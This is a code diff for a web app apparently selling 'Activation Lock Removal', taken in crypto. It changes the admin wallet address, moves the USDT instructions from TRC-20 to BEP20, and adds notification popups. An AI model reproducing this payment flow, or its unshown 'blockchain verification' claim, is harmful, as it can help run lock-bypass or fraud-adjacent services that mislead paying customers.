@@ -30,7 +30,8 @@ import {
   X,
   Cloud,
   Laptop,
-  Eye
+  Eye,
+  Bell
 } from 'lucide-react';
 
 import { DeviceOrder, NotificationItem, ActivityLog, PaymentHistoryItem, DeviceCheck } from './types';
@@ -95,6 +96,8 @@ export default function App() {
   // Application database stored in state and synchronized with Firestore
   const [orders, setOrders] = useState<DeviceOrder[]>(initialOrders);
   const [notifications, setNotifications] = useState<NotificationItem[]>(initialNotifications);
+  const [popupNotification, setPopupNotification] = useState<NotificationItem | null>(null);
+  const [forceOpenNotif, setForceOpenNotif] = useState(false);
   const [activityLogs, setActivityLogs] = useState<ActivityLog[]>(initialActivityLogs);
   const [paymentHistory, setPaymentHistory] = useState<PaymentHistoryItem[]>(initialPaymentHistory);
   const [deviceChecks, setDeviceChecks] = useState<DeviceCheck[]>([]);
@@ -112,7 +115,7 @@ export default function App() {
 
   // Client session details
   const userEmail = currentUser?.email || '';
-  const adminWallet = '0x1E4DFFa33C008888bBc20BBeEee4477FfFF1682';
+  const adminWallet = '0x5Dd3d764DC0d2C862F3B042C95B0e192A29be4C9';
 
   const isUserAdmin = Boolean(
     currentUser?.email && (
@@ -304,9 +307,21 @@ export default function App() {
       });
       if (list.length > 0) {
         // Filter notifications: admins see all. Customers see global (no userId) or notifications targeted to them.
+        const uEmail = currentUser.email?.toLowerCase();
+        const uUid = currentUser.uid?.toLowerCase();
+        const uDisplayId = `usr-${uUid?.substring(0, 8)}`;
+
         const filteredList = isUserAdmin
           ? list
-          : list.filter(n => !n.userId || n.userId === currentUser.uid);
+          : list.filter(n => {
+              if (!n.userId && !n.targetUserId && !n.targetEmail) return true; // Global notification
+              const tId = (n.targetUserId || n.userId || '').toLowerCase();
+              const tEmail = (n.targetEmail || '').toLowerCase();
+              if (uUid && tId === uUid) return true;
+              if (uDisplayId && tId === uDisplayId) return true;
+              if (uEmail && (tEmail === uEmail || tId === uEmail)) return true;
+              return false;
+            });
         setNotifications(filteredList.sort((a, b) => b.time.localeCompare(a.time)));
       } else {
         if (isUserAdmin) {
@@ -416,6 +431,31 @@ export default function App() {
 
     return () => unsubscribeUser();
   }, [currentUser]);
+
+  // Enforce browser tab title and branding
+  useEffect(() => {
+    document.title = "3uUnlocks - Activation Lock Removal";
+  }, []);
+
+  // Auto-show popup for new unread notifications when client logs in or receives live broadcast
+  useEffect(() => {
+    if (!currentUser || !notifications || notifications.length === 0) return;
+    const storageKey = `3u_last_popped_notif_${currentUser.uid}`;
+    const lastPoppedId = localStorage.getItem(storageKey);
+    
+    // Find the latest unread notification
+    const latestUnread = notifications.find(n => !n.read && n.id !== lastPoppedId);
+    if (latestUnread) {
+      localStorage.setItem(storageKey, latestUnread.id);
+      setPopupNotification(latestUnread);
+      
+      const timer = setTimeout(() => {
+        setPopupNotification(null);
+        setForceOpenNotif(true);
+      }, 2000);
+      return () => clearTimeout(timer);
+    }
+  }, [notifications, currentUser]);
 
   // Protected Pages Redirect Guard
   useEffect(() => {
@@ -1341,6 +1381,8 @@ export default function App() {
           }
         }}
         onOpenSupport={() => setIsSupportOpen(true)}
+        forceOpenNotif={forceOpenNotif}
+        onResetForceOpen={() => setForceOpenNotif(false)}
       />
 
       {/* Main Container Area */}
@@ -1711,16 +1753,16 @@ export default function App() {
                                         
                                         <div className="bg-white p-3 rounded-xl border border-slate-200/80 space-y-2.5 shadow-sm">
                                           <div className="flex justify-between items-center text-[10px] text-slate-400 uppercase font-mono font-bold">
-                                            <span>USDT (TRC-20 Address)</span>
+                                            <span>USDT (BEP20 Address)</span>
                                             <span className="text-[#1E4DFF]">100% Secure</span>
                                           </div>
                                           <div className="flex items-center gap-2">
                                             <span className="font-mono text-[11px] font-bold text-slate-800 bg-slate-50 px-2.5 py-1.5 rounded-lg border border-slate-100 flex-1 truncate select-all">
-                                              TYqSkaD82YhKshUdnsuY278shJ928hKsaP
+                                              {adminWallet}
                                             </span>
                                             <button 
                                               onClick={() => {
-                                                navigator.clipboard.writeText('TYqSkaD82YhKshUdnsuY278shJ928hKsaP');
+                                                navigator.clipboard.writeText(adminWallet);
                                                 alert('Payment address copied to clipboard!');
                                               }}
                                               className="bg-slate-100 hover:bg-slate-200 p-2 rounded-lg text-slate-600 transition-colors shrink-0 cursor-pointer"
@@ -1748,7 +1790,7 @@ export default function App() {
                                         <h4 className="font-bold text-slate-900 text-sm">Verifying Blockchain Node Status</h4>
                                       </div>
                                       <p className="text-xs text-slate-600 leading-relaxed">
-                                        Our server is checking the TRC-20 blockchain for the transaction. This takes between 1-5 minutes. Please do not close this session.
+                                        Our server is checking the BEP20 blockchain for the transaction. This takes between 1-5 minutes. Please do not close this session.
                                       </p>
                                       <div className="bg-white/80 p-3 rounded-xl border border-blue-100/30 text-[11px]">
                                         <h5 className="font-bold text-[#1E4DFF] mb-0.5">Verification:</h5>
@@ -2594,6 +2636,25 @@ export default function App() {
           isOpen={isSupportOpen}
           setIsOpen={setIsSupportOpen}
         />
+      )}
+
+      {/* Real-time Broadcast Notification Popup Toast */}
+      {popupNotification && (
+        <div className="fixed top-20 right-6 z-[99999] max-w-sm w-full bg-slate-900 text-white rounded-2xl shadow-2xl border-2 border-[#1E4DFF] p-4 animate-in slide-in-from-top-4 fade-in duration-300 flex items-start gap-3.5 backdrop-blur-md">
+          <div className="p-2.5 rounded-xl bg-[#1E4DFF] text-white shrink-0 animate-bounce">
+            <Bell className="w-5 h-5 stroke-[2.5]" />
+          </div>
+          <div className="flex-1 min-w-0">
+            <div className="flex items-center justify-between gap-2 mb-1">
+              <span className="text-[10px] font-black uppercase font-mono tracking-wider bg-blue-500/20 text-[#00D2FF] px-2 py-0.5 rounded-full border border-blue-500/30">
+                New Notification
+              </span>
+              <span className="text-[10px] font-mono text-slate-400">Just now</span>
+            </div>
+            <h4 className="font-extrabold text-white text-sm truncate">{popupNotification.title || 'System Alert'}</h4>
+            <p className="text-xs text-slate-300 line-clamp-2 mt-0.5 font-medium leading-relaxed">{popupNotification.description}</p>
+          </div>
+        </div>
       )}
 
     </div>
